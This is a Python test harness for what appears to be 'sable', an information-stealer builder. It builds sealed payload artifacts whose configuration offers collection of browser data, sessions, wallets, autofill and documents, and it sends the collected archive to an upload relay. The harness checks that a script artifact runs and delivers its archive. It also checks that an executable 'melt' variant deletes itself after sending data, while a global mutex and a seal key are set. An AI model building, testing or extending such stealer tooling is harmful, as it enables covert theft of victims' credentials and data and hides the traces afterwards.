"""The two paths no earlier run touched: self-remove, and the .py artifact.

Both are code the container can produce and the operator can pick, so both have to run
before the build is called finished.
"""

from __future__ import annotations

import shutil
import subprocess
import sys
import time
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))

from core import forge, seal  # noqa: E402
from core.schema import (  # noqa: E402
    SCHEMA_VERSION,
    RelayConfig,
    RunConfig,
    SourceConfig,
)

OUT = Path(r"C:\Users\Kuzenee\Desktop\55555\_harness\out")
STUB = ROOT / "tools" / "dist" / "sable-launcher.exe"
ENDPOINT = "http://127.0.0.1:8099/upload"

results: list[tuple[str, bool, str]] = []


def check(label: str, ok: bool, detail: str = "") -> None:
    results.append((label, ok, detail))


def config(seal_key: str, mutex: str, self_remove: bool) -> RunConfig:
    return RunConfig(
        schema_version=SCHEMA_VERSION,
        mutex=mutex,
        seal_key=seal_key,
        relay=RelayConfig(kind="https", endpoint=ENDPOINT),
        sources=SourceConfig(
            system=True,
            browsers=False,
            sessions=False,
            wallets=False,
            autofill=False,
            documents=False,
        ),
        self_remove=self_remove,
        ballast_mb=1,
    )


def build(cfg: RunConfig, destination: Path, mode: str) -> Path:
    sealed = seal.seal(forge.payload(ROOT, cfg), cfg.seal_key)
    return forge.build(cfg, sealed, destination, mode=mode, stub=STUB)


def main() -> int:
    # --- the script artifact -------------------------------------------------
    script = build(config("bench-script-key", r"Global\SableScriptProbe", False), OUT / "sable-script.py", "py")
    check("script artifact written", script.is_file(), str(script.stat().st_size) if script.is_file() else "")

    started = time.monotonic()
    run = subprocess.run(
        [sys.executable, str(script)],
        capture_output=True,
        text=True,
        timeout=600,
        cwd=str(OUT),
    )
    elapsed = time.monotonic() - started
    check("script artifact runs", run.returncode == 0, f"exit {run.returncode} in {elapsed:.0f}s")
    if run.returncode != 0:
        check("script stderr", False, (run.stderr or "")[-400:])

    received = Path(r"C:\Users\Kuzenee\Desktop\55555\_harness\received\payload.zip")
    before = received.stat().st_size if received.is_file() else 0
    check("script artifact delivered", before > 0, f"{before} bytes on the relay")
    if received.is_file():
        received.unlink()

    # --- self-remove ---------------------------------------------------------
    doomed = build(config("bench-melt-key", r"Global\SableMeltProbe", True), OUT / "sable-melt.exe", "exe")
    check("artifact exists before the run", doomed.is_file(), str(doomed))

    proc = subprocess.run([str(doomed)], capture_output=True, timeout=600)
    check("self-remove run exits clean", proc.returncode == 0, f"exit {proc.returncode}")

    # The deletion is detached: cmd waits three pings (~3 s) for this process to die.
    deadline = time.monotonic() + 30
    while time.monotonic() < deadline and doomed.exists():
        time.sleep(0.5)

    check("the artifact deleted itself", not doomed.exists())
    check(
        "the relay still received the archive",
        received.is_file() and received.stat().st_size > 0,
        f"{received.stat().st_size if received.is_file() else 0} bytes",
    )

    failed = [item for item in results if not item[1]]
    for label, ok, detail in results:
        print(f"{'PASS' if ok else 'FAIL'}  {label}  {detail}")
    print(f"\n{len(results) - len(failed)}/{len(results)} passed")
    return 0 if not failed else 1


if __name__ == "__main__":
    raise SystemExit(main())
